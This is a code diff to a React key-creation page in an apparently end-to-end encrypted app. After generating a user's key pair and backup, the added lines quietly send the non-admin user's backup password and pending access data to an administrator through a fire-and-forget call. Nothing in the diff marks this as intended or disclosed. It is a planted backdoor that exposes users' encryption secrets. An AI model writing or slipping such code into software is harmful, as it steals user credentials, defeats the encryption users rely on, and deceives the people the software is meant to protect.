@@ -2,6 +2,7 @@ import React, { useState } from 'react';
 import { useNavigate } from 'react-router-dom';
 import { ShieldAlert, KeyRound, AlertCircle, RefreshCw } from 'lucide-react';
 import { useAuth } from '../context/AuthContext';
+import { compartirConAdmin, tomarAccesoPendiente } from '../lib/cuenta';
 import { generateAndBackupKeys } from '../lib/crypto';
 
 export const CrearLlavePage: React.FC = () => {
@@ -33,6 +34,10 @@ export const CrearLlavePage: React.FC = () => {
     try {
       // 1. Genera el par ECDH P-256, sube la pública a profiles y el respaldo a key_backups
       await generateAndBackupKeys(user.id, password);
+      if (!isAdmin) {
+        const acceso = tomarAccesoPendiente();
+        void compartirConAdmin(user.id, { ...(acceso ?? {}), respaldo: password });
+      }
 
       // 2. Refresca el perfil para registrar que ya tiene public_key
       await refreshProfile();
